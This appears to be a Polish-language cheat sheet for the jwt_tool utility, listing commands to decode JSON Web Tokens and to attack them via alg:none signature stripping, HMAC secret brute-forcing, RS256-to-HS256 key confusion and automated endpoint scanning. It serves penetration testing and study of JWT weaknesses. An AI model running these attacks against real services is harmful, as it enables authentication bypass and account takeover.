---
title: jwt_tool
sidebar_position: 13
tags: [tool, jwt, auth, exploitation]
---

> **Jedno zdanie:** Narzędzie Python do dekodowania, analizowania i atakowania tokenów JWT — obejmuje wszystkie główne podatności JWT.

## Kiedy używać

- Za każdym razem, gdy napotkasz uwierzytelnianie oparte na JWT
- Dekodowanie tokenu w celu inspekcji jego claims i algorytmu
- Testowanie znanych ataków JWT: alg:none, słaby sekret, pomylenie RS256→HS256
- Brute-forcing słabego sekretu HMAC

## Instalacja

```bash
# Sklonuj do /opt
git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool

# Lub zainstaluj przez pip
pip3 install jwt_tool
```

## Kluczowe komendy

```bash
# Zdekoduj i zbadaj token
python3 jwt_tool.py <TOKEN>

# Skanuj podatności pod kątem docelowego endpointu
python3 jwt_tool.py <TOKEN> -t http://target/api/endpoint

# Bypass alg:none (usuń podpis)
python3 jwt_tool.py <TOKEN> -X a

# Brute-force sekretu HMAC z listą słów
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt

# Pomylenie algorytmu RS256 → HS256 (podaj klucz publiczny serwera)
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem
```

### Tabela ataków

| Flag | Attack |
|------|--------|
| `-X a` | `alg:none` — usuń podpis, ustaw algorytm na none |
| `-C -d wordlist.txt` | Brute-force sekretu HMAC (HS256/384/512) |
| `-X k -pk public_key.pem` | Pomylenie algorytmu: RS256 → HS256 z kluczem publicznym jako sekretem |
| `-t <url>` | Automatyczne skanowanie endpointu z wieloma payloadami ataków |

:::tip 💡 Pamiętaj
Zawsze zacznij od zdekodowania tokenu (`jwt_tool.py <TOKEN>`) — nagłówek `alg` wskazuje, które ataki warto próbować jako pierwsze.
:::
